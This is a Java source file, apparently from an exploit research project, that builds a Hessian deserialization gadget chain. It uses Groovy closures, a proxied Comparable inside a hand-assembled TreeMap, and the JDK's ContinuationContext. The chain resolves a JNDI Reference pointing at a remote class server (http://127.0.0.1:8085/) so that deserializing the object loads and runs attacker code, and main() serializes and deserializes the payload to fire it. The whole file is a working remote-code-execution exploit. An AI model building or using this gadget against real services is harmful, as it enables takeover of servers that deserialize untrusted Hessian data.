package com.yyjcccc.hessianser.gadget;

import com.yyjccc.exploit.util.Reflect;
import com.yyjcccc.hessianser.usage.HessianSerize;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import javax.naming.CannotProceedException;
import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.Reference;

import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.util.Hashtable;
import java.util.TreeMap;

public class GroovyGadget {

	public static Object payload() throws Exception{
		String addr="http://127.0.0.1:8085/";
		String className="HVzHJCkI";
		Reference ref=new Reference(className,className,addr);

		CannotProceedException cpe = new CannotProceedException();
		Reflect.setValue(NamingException.class,cpe,"resolvedObj",ref);
		Class<?> aClass = Class.forName("javax.naming.spi.ContinuationContext");

		Constructor<?> constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
		constructor.setAccessible(true);
		Context context = (Context) constructor.newInstance(cpe, new Hashtable<>());

		MethodClosure methodClosure = new MethodClosure(context,"listBindings");
		ConvertedClosure closure=new ConvertedClosure(methodClosure,"compareTo");
		// 创建 ConvertedClosure 的动态代理类实例
		Comparable proxyMap = (Comparable) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
				new Class[]{Comparable.class}, closure);
		TreeMap treeMap = new TreeMap<>();
		Class<?> e = Class.forName("java.util.TreeMap$Entry");
		Constructor<?> declaredConstructor = e.getDeclaredConstructor(Object.class, Object.class, e);
		declaredConstructor.setAccessible(true);
		Object commonEntry = declaredConstructor.newInstance("a", 1, null);
		Reflect.setValue(treeMap,"root",commonEntry);

		//第三个参数为父节点
		Object proxyMapEntry = declaredConstructor.newInstance(proxyMap, 2, commonEntry);
		Reflect.setValue(treeMap,"size",2);
		Reflect.setValue(treeMap,"modCount",2);


		Reflect.setValue(commonEntry,"right",proxyMapEntry);
		return treeMap;
	}

	public static void main(String[] args) throws Exception {
		byte[] serialize = HessianSerize.serialize2(payload());
		HessianSerize.deserialize(serialize);
	}
}

